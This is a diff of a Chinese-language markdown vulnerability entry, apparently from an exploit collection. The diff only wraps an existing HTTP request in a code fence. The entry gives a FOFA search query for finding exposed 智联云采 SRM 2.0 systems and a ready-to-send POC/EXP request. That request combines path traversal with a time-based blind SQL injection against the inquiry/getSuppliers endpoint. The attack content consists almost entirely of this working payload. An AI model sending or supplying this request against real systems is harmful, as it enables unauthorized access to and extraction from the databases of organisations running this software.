@@ -85,6 +85,7 @@ FOFA：title=="SRM 2.0"
 
 POC/EXP：延时3秒，执行2次 
 
+```http
 POST /adpweb/static/%2e%2e;/a/srm/inquiry/getSuppliers?code=%27+AND+%28SELECT+1312+FROM+%28SELECT%28SLEEP%283%29%29%29HckV%29--+HyuV HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
@@ -92,6 +93,7 @@ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9
 Connection: keep-alive
+```
 
 ![image-20241121164407804](./.resource/智联云采SRM2.0inquirygetSuppliers处SQL注入漏洞/media/image-20241121164407804.png)
 
